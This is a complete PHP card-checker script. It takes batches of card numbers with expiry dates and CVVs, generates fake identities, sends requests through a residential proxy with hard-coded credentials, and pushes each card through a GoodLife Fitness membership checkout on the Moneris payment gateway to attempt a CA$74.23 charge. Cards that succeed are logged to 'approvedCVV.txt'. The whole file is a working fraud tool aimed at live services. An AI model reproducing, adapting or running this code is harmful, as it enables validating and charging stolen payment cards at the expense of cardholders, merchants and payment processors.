<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');
set_time_limit(0);

is_dir('COOKIE') || mkdir('COOKIE', 0755, true);

$d = __DIR__ . '/COOKIE';

$ii = [
  'cookie' => $d . '/' . mt_rand() . '.txt'
];

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error_log.txt');

// Test mode check
if (isset($_GET['test']) && $_GET['test'] === 'true') {
  echo json_encode(['status' => 'success', 'message' => 'Test mode active']);
  exit;
}


function generateWebKitBoundary($length = 16)
{
  $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $charactersLength = strlen($characters);
  $randomString = '';

  for ($i = 0; $i < $length; $i++) {
    $randomString .= $characters[rand(0, $charactersLength - 1)];
  }

  return $randomString;
}




function eut($ako, $ay, $pogi)
{
  $ikawba = explode($ay, $ako);
  $ikawba = explode($pogi, $ikawba[1]);
  return $ikawba[0];
}

function usPhone()
{
  $areaCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $exchangeCode = mt_rand(2, 9) . mt_rand(0, 9) . mt_rand(0, 9);
  $subscriberNumber = mt_rand(1000, 9999);
  $phoneNumber = "1" . $areaCode . $exchangeCode . $subscriberNumber;

  return $phoneNumber;
}


function fname($z1 = 5)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

function lname($z1 = 7)
{
  $u2 = '';
  $x3 = array("a", "e", "i", "o", "u");
  $c4 = array('b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z');
  $f5 = $z1 / 2;
  for ($y6 = 1; $y6 <= $f5; $y6++) {
    $u2 .= $c4[rand(0, 19)];
    $u2 .= $x3[rand(0, 4)];
  }
  return $u2;
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  exit;
}

function formatPublicKey($key)
{
  $key = wordwrap($key, 64, "\n", true);
  return $key;
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $input = file_get_contents('php://input');
  $cards = json_decode($input, true);

  if (!is_array($cards)) {
    echo json_encode(['error' => 'Invalid input']);
    exit;
  }

  $processedCards = [];

  foreach ($cards as $card) {
    $ccs = explode("|", $card);

    if (count($ccs) !== 4) {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => 'Error'];
      continue;
    }

    $cc = $ccs[0];
    $mes = $ccs[1];
    $ano = $ccs[2];
    $ano2 = substr($ano, -2);
    $cvv = $ccs[3];


    $name = fname();
    $last = lname();
    $email = $name . $last . rand(111111, 999999) . '@gmail.com';
    $pass = $name . rand(11111, 99999);
    $phone = rand(11111111111, 88888888888);
    $ukpostal = chr(rand(65, 90)) . chr(rand(65, 90)) . rand(0, 9) . " " . rand(0, 9) . chr(rand(65, 90)) . chr(rand(65, 90));
    $canadapostal = chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . " " . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9);
    $caphone =
      sprintf('(705) %03d-%04d', rand(200, 999), rand(1000, 9999));
    $usPhone = usPhone();

    $d1 = getcwd();
    $d = str_replace('\\', '/', $d1);

    $userAgents = [
      // Chrome on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',

      // Chrome on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',

      // Firefox on Windows
      'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',

      // Firefox on macOS
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',

      // Safari on iOS
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',

      // Chrome on Android
      'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
      'Mozilla/5.0 (Linux; Android 9; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36',

      // Opera on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.137',

      // Edge on Windows
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.48 Safari/537.36 Edg/91.0.864.48'
    ];


    $referers = [
      'https://www.google.com/',
      'https://www.bing.com/',
      'https://www.yahoo.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.linkedin.com/',
      'https://www.reddit.com/',
      'https://www.amazon.com/',
      'https://www.ebay.com/',
      'https://www.netflix.com/',
      'https://www.wikipedia.org/',
      'https://www.quora.com/',
      'https://www.medium.com/',
      'https://www.alhambrawater.com/',
      'https://www.news.com/',
      'https://www.nytimes.com/',
      'https://www.washingtonpost.com/',
      'https://www.theguardian.com/',
      'https://www.bbc.com/',
      'https://www.facebook.com/',
      'https://www.instagram.com/'
    ];


    $userAgent = $userAgents[array_rand($userAgents)];
    $referer = $referers[array_rand($referers)];
    $webkit = generateWebKitBoundary();


    // $isoCodes = [
    //   "AF",
    //   "AX",
    //   "AL",
    //   "DZ",
    //   "AS",
    //   "AD",
    //   "AO",
    //   "AI",
    //   "AQ",
    //   "AG",
    //   "AR",
    //   "AM",
    //   "AW",
    //   "AU",
    //   "AT",
    //   "AZ",
    //   "BS",
    //   "BH",
    //   "BD",
    //   "BB",
    //   "BY",
    //   "BE",
    //   "BZ",
    //   "BJ",
    //   "BM",
    //   "BT",
    //   "BO",
    //   "BQ",
    //   "BA",
    //   "BW",
    //   "BV",
    //   "BR",
    //   "IO",
    //   "BN",
    //   "BG",
    //   "BF",
    //   "BI",
    //   "CV",
    //   "KH",
    //   "CM",
    //   "CA",
    //   "KY",
    //   "CF",
    //   "TD",
    //   "CL",
    //   "CN",
    //   "CX",
    //   "CC",
    //   "CO",
    //   "KM",
    //   "CG",
    //   "CD",
    //   "CK",
    //   "CR",
    //   "CI",
    //   "HR",
    //   "CU",
    //   "CW",
    //   "CY",
    //   "CZ",
    //   "DK",
    //   "DJ",
    //   "DM",
    //   "DO",
    //   "EC",
    //   "EG",
    //   "SV",
    //   "GQ",
    //   "ER",
    //   "EE",
    //   "SZ",
    //   "ET",
    //   "FK",
    //   "FO",
    //   "FJ",
    //   "FI",
    //   "FR",
    //   "GF",
    //   "PF",
    //   "TF",
    //   "GA",
    //   "GM",
    //   "GE",
    //   "DE",
    //   "GH",
    //   "GI",
    //   "GR",
    //   "GL",
    //   "GD",
    //   "GP",
    //   "GU",
    //   "GT",
    //   "GG",
    //   "GN",
    //   "GW",
    //   "GY",
    //   "HT",
    //   "HM",
    //   "VA",
    //   "HN",
    //   "HK",
    //   "HU",
    //   "IS",
    //   "IN",
    //   "ID",
    //   "IR",
    //   "IQ",
    //   "IE",
    //   "IM",
    //   "IL",
    //   "IT",
    //   "JM",
    //   "JP",
    //   "JE",
    //   "JO",
    //   "KZ",
    //   "KE",
    //   "KI",
    //   "KP",
    //   "KR",
    //   "KW",
    //   "KG",
    //   "LA",
    //   "LV",
    //   "LB",
    //   "LS",
    //   "LR",
    //   "LY",
    //   "LI",
    //   "LT",
    //   "LU",
    //   "MO",
    //   "MG",
    //   "MW",
    //   "MY",
    //   "MV",
    //   "ML",
    //   "MT",
    //   "MH",
    //   "MQ",
    //   "MR",
    //   "MU",
    //   "YT",
    //   "MX",
    //   "FM",
    //   "MD",
    //   "MC",
    //   "MN",
    //   "ME",
    //   "MS",
    //   "MA",
    //   "MZ",
    //   "MM",
    //   "NA",
    //   "NR",
    //   "NP",
    //   "NL",
    //   "NC",
    //   "NZ",
    //   "NI",
    //   "NE",
    //   "NG",
    //   "NU",
    //   "NF",
    //   "MK",
    //   "MP",
    //   "NO",
    //   "OM",
    //   "PK",
    //   "PW",
    //   "PS",
    //   "PA",
    //   "PG",
    //   "PY",
    //   "PE",
    //   "PH",
    //   "PN",
    //   "PL",
    //   "PT",
    //   "PR",
    //   "QA",
    //   "RE",
    //   "RO",
    //   "RU",
    //   "RW",
    //   "BL",
    //   "SH",
    //   "KN",
    //   "LC",
    //   "MF",
    //   "PM",
    //   "VC",
    //   "WS",
    //   "SM",
    //   "ST",
    //   "SA",
    //   "SN",
    //   "RS",
    //   "SC",
    //   "SL",
    //   "SG",
    //   "SX",
    //   "SK",
    //   "SI",
    //   "SB",
    //   "SO",
    //   "ZA",
    //   "GS",
    //   "SS",
    //   "ES",
    //   "LK",
    //   "SD",
    //   "SR",
    //   "SJ",
    //   "SE",
    //   "CH",
    //   "SY",
    //   "TW",
    //   "TJ",
    //   "TZ",
    //   "TH",
    //   "TL",
    //   "TG",
    //   "TK",
    //   "TO",
    //   "TT",
    //   "TN",
    //   "TR",
    //   "TM",
    //   "TC",
    //   "TV",
    //   "UG",
    //   "UA",
    //   "AE",
    //   "GB",
    //   "US",
    //   "UM",
    //   "UY",
    //   "UZ",
    //   "VU",
    //   "VE",
    //   "VN",
    //   "VG",
    //   "VI",
    //   "WF",
    //   "EH",
    //   "YE",
    //   "ZM",
    //   "ZW"
    // ];

    // $randomIsoCode = strtolower($isoCodes[array_rand($isoCodes)]);


    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.CreatePersonByPerson.json");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'firstName=' . $name . '&lastName=' . $last . '&dateOfBirth=' . rand(1900, 2000) . '-12-12&gender=0&address=' . rand(1657, 1989) . ' Kent St W&unit=&city=Lindsay&prov=ON&postalCode=K9V 2Z1&country=CA&email=' . $email . '&homePhone=&workPhone=&workPhoneExt=&mobilePhone=' . $caphone . '&emergencyContact=' . $last . ' ' . $name . '&emergencyContactPhone=' . $caphone . '&clubProvince=Ontario&salesId=0&productId=43827&productName=Online - Ultimate - Bi-weekly&productType=1&saleClubId=171&startDate=2024-08-10T23:26:47.843997');
    $h = array();
    $h[] = 'accept: application/json, text/plain, */*';
    $h[] = 'csrf-token: undefined';
    $h[] = 'content-type: application/x-www-form-urlencoded';
    $h[] = 'origin: https://www.goodlifefitness.com';
    $h[] = 'referer: https://www.goodlifefitness.com/membership/e-commerce.html?type=1&id=43827&name=Online%20-%20Ultimate%20-%20Bi-weekly&club=171';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g1 = curl_exec($g);
    $salesid = eut($g1, '"SalesId":"', '"');
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.GetTicket.json");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'txn_total=74.23');
    $h = array();
    $h[] = 'accept: application/json, text/plain, */*';
    $h[] = 'content-type: application/x-www-form-urlencoded';
    $h[] = 'origin: https://www.goodlifefitness.com';
    $h[] = 'referer: https://www.goodlifefitness.com/membership/e-commerce.html?type=1&id=43827&name=Online%20-%20Ultimate%20-%20Bi-weekly&club=171';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g2 = curl_exec($g);
    $ticket = eut($g2, '"ticket":"', '"');
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/index.php?tck=$ticket");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_HTTPGET, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    $h = array();
    $h[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    $h[] = 'Host: gateway.moneris.com';
    $h[] = 'referer: https://www.goodlifefitness.com/';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g3 = curl_exec($g);
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'pan=' . $cc . '&ticket=' . $ticket . '&action=get_card_type');
    $h = array();
    $h[] = 'accept: application/json, text/javascript, */*; q=0.01';
    $h[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $h[] = 'host: gateway.moneris.com';
    $h[] = 'origin: https://gateway.moneris.com';
    $h[] = 'referer: https://gateway.moneris.com/chkt/display/index.php?tck=' . $ticket . '';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g4 = curl_exec($g);
    $cardt = eut($g4, ',"name":"', '","image"');
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'ticket=' . $ticket . '&action=validate_transaction&cardholder=' . $name . '+' . $last . '&pan=' . $cc . '&expiry_date=' . $mes . '' . $ano2 . '&=Pay&cvv=' . $cvv . '&currency_code=CAD&wallet_details=%7B%7D&gift_details=%7B%7D&card_data_key=new');
    $h = array();
    $h[] = 'accept: application/json, text/javascript, */*; q=0.01';
    $h[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $h[] = 'host: gateway.moneris.com';
    $h[] = 'origin: https://gateway.moneris.com';
    $h[] = 'referer: https://gateway.moneris.com/chkt/display/index.php?tck=' . $ticket . '';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g5 = curl_exec($g);
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'ticket=' . $ticket . '&action=process_transaction&cardholder=' . $name . '+' . $last . '&pan=' . $cc . '&expiry_date=' . $mes . '' . $ano2 . '&=Pay&cvv=' . $cvv . '&currency_code=CAD&wallet_details=%7B%7D&gift_details=%7B%7D&card_data_key=new');
    $h = array();
    $h[] = 'accept: application/json, text/javascript, */*; q=0.01';
    $h[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $h[] = 'host: gateway.moneris.com';
    $h[] = 'origin: https://gateway.moneris.com';
    $h[] = 'referer: https://gateway.moneris.com/chkt/display/index.php?tck=' . $ticket . '';
    $h[] = 'x-requested-with: XMLHttpRequest';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g6 = curl_exec($g);
    curl_close($g);

    $g = curl_init();
    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
    curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.ProcessCardSale.json");
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_POST, 1);
    //curl_setopt($g, CURLOPT_HEADER, 1);
    curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($g, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($g, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($g, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($g, CURLOPT_POSTFIELDS, 'ticket=' . $ticket . '&saleId=' . $salesid . '');
    $h = array();
    $h[] = 'accept: application/json, text/plain, */*';
    $h[] = 'content-type: application/x-www-form-urlencoded';
    $h[] = 'origin: https://www.goodlifefitness.com';
    $h[] = 'referer: https://www.goodlifefitness.com/membership/e-commerce.html?type=1&id=43827&name=Online%20-%20Ultimate%20-%20Bi-weekly&club=171';
    $h[] = 'user-agent: ' . $userAgent . '';
    curl_setopt($g, CURLOPT_HTTPHEADER, $h);
    $g7 = curl_exec($g);

    $msg = eut($g7, '"message":"', '",');

    if (strpos($g7, '"status":"success"') !== false && strpos($g7, '"message":"Success"') !== false) {
      $processedCards[] = ['card' => $card, 'status' => 'approved', 'message' => "Charged CA74"];
      fwrite(fopen("approvedCVV.txt", "a"), $card . "\r\n");
    } elseif (empty($msg)) {
      $processedCards[] = ['card' => $card, 'status' => 'Error', 'message' => 'Error in API. Check logs.'];
    } else {
      $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => "Moneris -> $msg"];
    }


    curl_close($g);
  }

  echo json_encode($processedCards);
}
